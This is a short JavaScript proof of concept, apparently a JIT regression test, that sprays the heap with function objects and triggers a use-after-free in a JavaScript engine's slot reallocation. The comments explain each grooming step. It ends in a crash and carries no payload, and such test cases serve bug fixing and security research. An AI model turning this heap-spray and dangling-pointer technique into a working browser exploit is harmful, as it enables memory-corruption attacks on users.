function init() {
    // Create an object to be read for the UAF
    var target = {};
    for (var i = 0; i < 100; i++) {
        target["a" + i] = i;
    }
    var arr = [];
    for (var i = 0; i < 50 * 1000; i++) {
        // The vulnerable target - Objects (lazy constructors)
        var cons = function() {};
        // Fills the JSFunction's slots array size so that one more
        // addition to it will cause reallocation
        cons.x1 = 1;
        cons.x2 = target;
        cons.x3 = 3;
        cons.x4 = 4;
        cons.x5 = 5;
        cons.x6 = 6;
        cons.x7 = 7;
        // Adds the function to an array
        arr.push(cons);
    }
    return arr;
}

function f() {
    // Spray objects on the heap
    var arr = init();
    // Choose an object in the heap after the spray
    var interesting = arr[arr.length - 10];
    for (var i = 0; i < arr.length; i++) {
        // Get the next object in the array
        var cons = arr[i];
        // Set a property - caches the load of 'interesting' slots
        interesting.x1 = 10;
        // Among other nodes, it adds MCallGetProperty. This creates and
        // stores the prototype to the slots, resulting in the slot array
        // location being moved because it doesn't have enough space
        // available
        new cons();
        // Crashes when (cons === interesting) because x2 is a freed
        // location and a10 is now 0xe5e5e5e5.
        assertEq(interesting.x2.a10, 10);
    }
}

f();